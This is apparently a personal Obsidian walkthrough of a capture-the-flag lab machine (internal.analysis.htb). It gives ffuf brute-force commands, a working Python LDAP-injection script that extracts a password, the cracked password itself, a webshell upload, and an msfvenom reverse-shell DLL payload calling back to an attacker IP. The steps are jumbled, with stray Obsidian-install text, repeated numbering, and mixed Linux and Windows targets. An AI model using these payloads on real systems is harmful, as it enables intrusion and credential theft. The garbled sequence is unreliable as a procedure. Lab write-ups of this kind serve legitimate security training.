sup:: [[Home]]
tags:: #map 

# Monitored 🗃

![[Pasted image 20240125085030.png]]

Let's get started...

---
### Steps
1.  **Start your vpn**
	Go to the directory where your downloaded vpn and start the vpn as shown below
	
![[Pasted image 20240114130711.png]]

Click on the giant purple button to download it for your OS (it should auto-detect what you have). Once it is downloaded, open the file to install and YAYAYAYAYAY!
Your computer now has Obsidian.

Next, we will perform directory bruteforcing with dirsearch:

![[Pasted image 20240125091611.png]]

2. Run a scan using incursore.sh
    
![[Pasted image 20240125091813.png]]
![[Pasted image 20240125094504.png]]
![[Pasted image 20240125095313.png]]

3. Began enumerating the dns for sub-domains:
	a. 	
![[Pasted image 20240125104520.png]]

	b. I tried running with gobuster:

![[Pasted image 20240125120548.png]]

ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/FUZZ

![[Pasted image 20240126123301.png]]
![[Pasted image 20240126124148.png]]

![[Pasted image 20240126082147.png]]

		c. Next, again ran ffuf

ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/employees/FUZZ -e .php,.html,.js

![[Pasted image 20240125192113.png]]

![[Pasted image 20240125193911.png]]


6. Next, 

![[Pasted image 20240125185823.png]]

7. Ran ffuf again but this time it was for the /users

ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/users/FUZZ -e .php,.html,.js


![[Pasted image 20240125204937.png]]

9. Accessing the /list.php page, we found this:
![[Pasted image 20240126024735.png]]


10. Now, since the parameter is missing let's try with parameters:

id=1&name=test
![[Pasted image 20240126031222.png]]

name=*
![[Pasted image 20240126031321.png]]


12. Enumerated with kerberute
![[Pasted image 20240126081530.png]]

13. Crafted a python script to crack the password:
#!/usr/bin/python

import argparse
import requests
import urllib.parse

def main():
    charset_path = "/home/kali/SecLists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    add_star = True
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)
            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue
            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue
            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)
            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)
if __name__ == "__main__":
    main()

14. The script was able to find the password:

![[Pasted image 20240126085743.png]]
I checked the IP of my VPN
97NTtl*4QP96BV

I now inserted it into the shell command and clicked on Save button:


12. Used the found credentials to enter into the login page:

![[Pasted image 20240126085529.png]]

14. And we got authenticated:

![[Pasted image 20240126090239.png]]

16. Navigated to SOC Report and went in search of a webshell to see if I can upload it to the site:
![[Pasted image 20240126090520.png]]
![[Pasted image 20240126104443.png]]

18. Since we uploaded the webshell and there wasn't error "File is safe" we need to confirm if it uploaded successfully:
http://internal.analysis.htb/dashboard/uploads/webshell.php?cmd=whoami

![[Pasted image 20240126104542.png]]

19. Now, let's use a php cmd shell to upload this time:

![[Pasted image 20240126120722.png]]


![[Pasted image 20240127091751.png]]


21. We could try to abuse the service by either stopping, restarting and so on the npcd service. But first, let's attempt to stop the service.

Note: Before we do that I always like to create a backup file, just in case something goes wrong we can always revert back:

![[Pasted image 20240127092659.png]]

![[Pasted image 20240127092914.png]]

![[Pasted image 20240127100342.png]]

16. Created a dll payload for transfer to the target:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.151 LPORT=4555 -f dll -o r2.dll

![[Pasted image 20240127120423.png]]


16. Upload the dll file
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd

![[Pasted image 20240127104013.png]]

17. Now. let's delete the npcd file

![[Pasted image 20240127104054.png]]

18. Now, we can create our own npcd file with a reverse shell code inside:

![[Pasted image 20240127104249.png]]

19. Give the file execute permissions:

![[Pasted image 20240127114949.png]]


20 . Remove any exploit to clean up the system

Powershell commandlet
Remove-Item C:\Snort\lib\snort_dynamicpreprocessor\l2.dll

![[Pasted image 20240127140951.png]]

So, finally we escalated our privileges to the root user!!!